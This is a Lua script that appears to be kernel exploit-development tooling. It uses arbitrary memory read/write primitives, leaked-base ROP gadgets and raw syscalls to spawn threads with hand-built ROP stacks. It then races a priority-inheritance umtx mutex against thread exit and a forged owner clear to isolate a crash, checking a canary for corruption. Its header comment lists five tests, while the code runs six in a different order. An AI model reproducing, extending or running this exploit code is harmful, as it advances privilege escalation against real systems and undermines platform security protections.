-- CRASH_CLASS: HIGH
-- PROBE 97b: Isolate exit-vs-UMTX crash from 97a
--
-- 97a crashed during Section B (TRYLOCK spin + m_owner clear + exit).
-- This probe tests each component separately to find the trigger:
--   A) Spinners TRYLOCK/UNLOCK on PI mutex — no exit, no clear (safe baseline)
--   B) Exit-with-lock + m_owner clear — no spinners (97a Section A was safe)
--   C) Spinners + m_owner clear — no exit (is PI confusion enough?)
--   D) 1 spinner + exit + m_owner clear (minimum race repro)
--   E) 8 spinners + exit + m_owner clear (97a repro)

print("=== PROBE 97b: ISOLATE EXIT-UMTX CRASH ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO syscall_address") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local mm=mk(477); local tc=mk(430); local c624=mk(624)
local sc_umtx=mk(454)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
print("gadgets OK")

local _DI=0x048; local _SI=0x050; local _DX=0x058
local _R10=0x060; local _R8=0x068; local _AX=0x078
local _CS=0x0C0; local _FL=0x0D0; local _IP=0x0E0
local _SP=0x0F8; local _SS=0x100; local _MG=0x108; local _TP=0x110

local function vmc()
    local ok,c=pcall(function() return c624(uint64(0),uint64(0),uint64(0)) end)
    return ok and N(c) or -1
end

local MAX_CH=40
local STK_PG=1
local PG_PER_CHILD=STK_PG+1
local TOTAL_PG=2+MAX_CH*PG_PER_CHILD

local ok_m,region=pcall(function()
    return mm(uint64(0),uint64(TOTAL_PG*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local R=N(region)

local ts999=R; wq(ts999,uint64(999)); wq(ts999+8,uint64(0))
local ts1ms=R+0x20; wq(ts1ms,uint64(0)); wq(ts1ms+8,uint64(1000000))
local ts5ms=R+0x40; wq(ts5ms,uint64(0)); wq(ts5ms+8,uint64(5000000))
local ts50ms=R+0x60; wq(ts50ms,uint64(0)); wq(ts50ms+8,uint64(50000000))
local ts2ms=R+0x80; wq(ts2ms,uint64(0)); wq(ts2ms+8,uint64(2000000))
local tb=R+0xA0
local exit_flag=R+0xC0
local pi_mtx=R+0x200

local cidx=0
local function child_stk(i) return R+0x4000*(2+i*PG_PER_CHILD) end
local function child_ctx(i) return R+0x4000*(2+i*PG_PER_CHILD+STK_PG) end

local function set_ctx(ctx, rsp, rax, rdi, rsi, rdx, r10, r8)
    z(ctx, 0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA); wq(ctx+_SP,rsp)
    wq(ctx+_AX,uint64(rax))
    wq(ctx+_DI,uint64(rdi)); wq(ctx+_SI,uint64(rsi))
    wq(ctx+_DX,uint64(rdx)); wq(ctx+_R10,uint64(r10))
    wq(ctx+_R8,uint64(r8))
end

local function spawn_raw(rax, rdi, rsi, rdx, r10, r8, rop_fn)
    if cidx>=MAX_CH then return nil end
    local si=cidx; cidx=cidx+1
    local stk=child_stk(si)
    local ctx=child_ctx(si)
    local off=0
    if rop_fn then off=rop_fn(stk) end
    wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(ts999)); off=off+8
    wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(0)); off=off+8
    wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(240)); off=off+8
    wq(stk+off,SA); off=off+8
    set_ctx(ctx, uint64(stk), rax, rdi, rsi, rdx, r10, r8)
    wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx),uint64(tb),uint64(0)) end)
    return rq(tb)
end

-- Helper: spawn child that locks PI mutex, sleeps delay_ts, then thr_exits
local function spawn_lock_exit(delay_ts)
    return spawn_raw(454, pi_mtx, 5, 0, 0, 0, function(stk)
        local off=0
        wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(delay_ts)); off=off+8
        wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(0)); off=off+8
        wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(240)); off=off+8
        wq(stk+off,SA); off=off+8
        wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(exit_flag)); off=off+8
        wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(431)); off=off+8
        wq(stk+off,SA); off=off+8
        return off
    end)
end

-- Helper: spawn TRYLOCK/UNLOCK spinner
local function spawn_spinner()
    return spawn_raw(454, pi_mtx, 4, 0, 0, 0, function(stk)
        local off=0
        local cycles=math.floor((STK_PG*0x4000-200)/80)
        for j=1,cycles do
            wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(6)); off=off+8
            wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(454)); off=off+8
            wq(stk+off,SA); off=off+8
            wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(4)); off=off+8
            wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(454)); off=off+8
            wq(stk+off,SA); off=off+8
        end
        return off
    end)
end

local function fresh_pi()
    z(pi_mtx, 0x20)
    wd(pi_mtx, 0); wd(pi_mtx+4, 4)
    wq(exit_flag, uint64(0))
end

local function check(label)
    local mo=rd(pi_mtx) or 0
    if mo<0 then mo=mo+0x100000000 end
    local c=N(native.fcall_with_rax(stub,20))
    local fl=rd(exit_flag) or 0
    print(string.format("%s: mo=0x%X flag=%d can=%d %s",
        label, mo, fl, c, c==pid and "OK" or "!!CANARY"))
    return c==pid
end

-- ============================================================
-- A: SPINNERS ONLY — no exit, no clear (safe baseline)
-- ============================================================
print("--- A: SPINNERS ONLY (baseline) ---")
print("A: start")
fresh_pi()
-- Lock from main so spinners fail TRYLOCK (normal contention)
pcall(function() sc_umtx(uint64(pi_mtx),uint64(5),uint64(0),uint64(0),uint64(0)) end)
print("A: locked by main")

for i=1,4 do spawn_spinner() end
print("A: 4 spinners running")

native.fcall_with_rax(stub,240,ts50ms,0)
pcall(function() sc_umtx(uint64(pi_mtx),uint64(6),uint64(0),uint64(0),uint64(0)) end)
if not check("A") then print("ABORT") return end
print("A: PASS")

-- ============================================================
-- B: SPINNERS + CLEAR — no exit
-- ============================================================
print("")
print("--- B: SPINNERS + CLEAR (no exit) ---")
print("B: start")
fresh_pi()
pcall(function() sc_umtx(uint64(pi_mtx),uint64(5),uint64(0),uint64(0),uint64(0)) end)
print("B: locked by main")

for i=1,4 do spawn_spinner() end
print("B: 4 spinners running")

native.fcall_with_rax(stub,240,ts2ms,0)
print("B: clearing m_owner")
wd(pi_mtx, 0)  -- trick: spinners can now acquire

native.fcall_with_rax(stub,240,ts50ms,0)
-- Unlock (we still own it kernel-side)
pcall(function() sc_umtx(uint64(pi_mtx),uint64(6),uint64(0),uint64(0),uint64(0)) end)
if not check("B") then print("ABORT") return end
print("B: PASS")

-- ============================================================
-- C: EXIT + CLEAR — no spinners
-- ============================================================
print("")
print("--- C: EXIT + CLEAR (no spinners) ---")
print("C: start")
fresh_pi()

spawn_lock_exit(ts5ms)
print("C: child locks+will exit in 5ms")

native.fcall_with_rax(stub,240,ts2ms,0)
print("C: clearing m_owner")
wd(pi_mtx, 0)

native.fcall_with_rax(stub,240,ts50ms,0)
if not check("C") then print("ABORT") return end
print("C: PASS")

-- ============================================================
-- D: 1 SPINNER + EXIT + CLEAR (minimum race)
-- ============================================================
print("")
print("--- D: 1 SPINNER + EXIT + CLEAR ---")
print("D: start")
fresh_pi()

spawn_lock_exit(ts5ms)
print("D: child A locks+will exit in 5ms")

spawn_spinner()
print("D: 1 spinner running")

native.fcall_with_rax(stub,240,ts2ms,0)
print("D: clearing m_owner")
wd(pi_mtx, 0)

native.fcall_with_rax(stub,240,ts50ms,0)
if not check("D") then print("ABORT") return end
print("D: PASS")

-- ============================================================
-- E: 4 SPINNERS + EXIT + CLEAR (medium race)
-- ============================================================
print("")
print("--- E: 4 SPINNERS + EXIT + CLEAR ---")
print("E: start")
fresh_pi()

spawn_lock_exit(ts5ms)
print("E: child A locks+will exit in 5ms")

for i=1,4 do spawn_spinner() end
print("E: 4 spinners running")

native.fcall_with_rax(stub,240,ts2ms,0)
print("E: clearing m_owner")
wd(pi_mtx, 0)

native.fcall_with_rax(stub,240,ts50ms,0)
if not check("E") then print("ABORT") return end
print("E: PASS")

-- ============================================================
-- F: 8 SPINNERS + EXIT + CLEAR (97a repro)
-- ============================================================
print("")
print("--- F: 8 SPINNERS + EXIT + CLEAR (97a repro) ---")
print("F: start")
fresh_pi()

spawn_lock_exit(ts5ms)
print("F: child A locks+will exit in 5ms")

for i=1,8 do spawn_spinner() end
print("F: 8 spinners running")

native.fcall_with_rax(stub,240,ts2ms,0)
print("F: clearing m_owner")
wd(pi_mtx, 0)

native.fcall_with_rax(stub,240,ts50ms,0)
if not check("F") then print("ABORT") return end
print("F: PASS")

-- ============================================================
print("")
print(string.format("ALL PASS ch=%d", cidx))
print("final canary="..N(native.fcall_with_rax(stub,20)))
print("=== 97b COMPLETE ===")
